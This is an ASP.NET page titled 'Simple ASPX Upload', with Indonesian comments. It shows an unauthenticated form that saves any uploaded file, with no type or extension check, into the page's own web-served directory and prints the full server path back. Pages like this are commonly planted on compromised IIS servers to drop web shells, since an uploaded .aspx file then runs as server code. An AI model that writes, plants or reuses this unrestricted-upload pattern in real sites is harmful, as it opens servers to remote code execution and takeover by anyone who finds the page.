<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html>
<html>
<head>
    <title>Simple ASPX Upload</title>
    <style>
        body {
            font-family: Consolas, monospace;
            font-size: 14px;
        }
    </style>
</head>

<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.HttpMethod == "POST")
        {
            Response.Write(UploadFile());
        }
        else
        {
            Response.Write(GetUploadForm());
        }
    }

    private string UploadFile()
    {
        try
        {
            if (Request.Files.Count == 0)
                return "❌ No file uploaded";

            HttpPostedFile file = Request.Files[0];

            // ambil folder tempat ASPX ini berada
            string currentDir = Path.GetDirectoryName(Request.PhysicalPath);

            // ambil nama file saja (anti path traversal dikit)
            string fileName = Path.GetFileName(file.FileName);

            string savePath = Path.Combine(currentDir, fileName);

            file.SaveAs(savePath);

            return
                "✅ Upload berhasil<br>" +
                "📂 Path: <b>" + savePath + "</b>";
        }
        catch (Exception ex)
        {
            return "❌ Error: " + ex.Message;
        }
    }

    private string GetUploadForm()
    {
        return @"
        <form method='post' enctype='multipart/form-data'>
            <p>Select file:</p>
            <input type='file' name='file'><br><br>
            <input type='submit' value='Upload'>
        </form>";
    }

</script>

<body>
</body>
</html>
